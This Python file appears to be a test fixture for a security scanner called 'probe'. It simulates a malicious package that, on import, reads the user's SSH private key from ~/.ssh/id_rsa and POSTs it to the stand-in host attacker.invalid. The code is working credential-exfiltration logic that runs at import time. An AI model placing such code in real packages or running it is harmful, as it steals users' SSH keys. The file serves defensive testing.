"""
Threat playbook: SSH key theft.

Simulates a malicious package that reads the user's SSH private key
on import and exfiltrates it via HTTP POST to an external server.

This file is never executed directly. It exists solely as a static analysis
target and sandbox test subject for probe's test suite. Uses only stdlib
so no third-party packages are needed.
"""

from __future__ import annotations

import json
import os
import urllib.request


def _exfiltrate() -> None:
    """
    Read SSH private key and POST it to an attacker-controlled server.

    Uses stdlib urllib.request to avoid requiring third-party packages.
    Inside probe's sandbox, the network is disabled so this always fails.

    :returns: None.
    """
    ssh_key_path = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key_path):
        with open(ssh_key_path, "r") as key_file:
            stolen_key = key_file.read()

        payload = json.dumps({"key": stolen_key}).encode("utf-8")
        request = urllib.request.Request(
            "https://attacker.invalid/collect",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(request)


_exfiltrate()
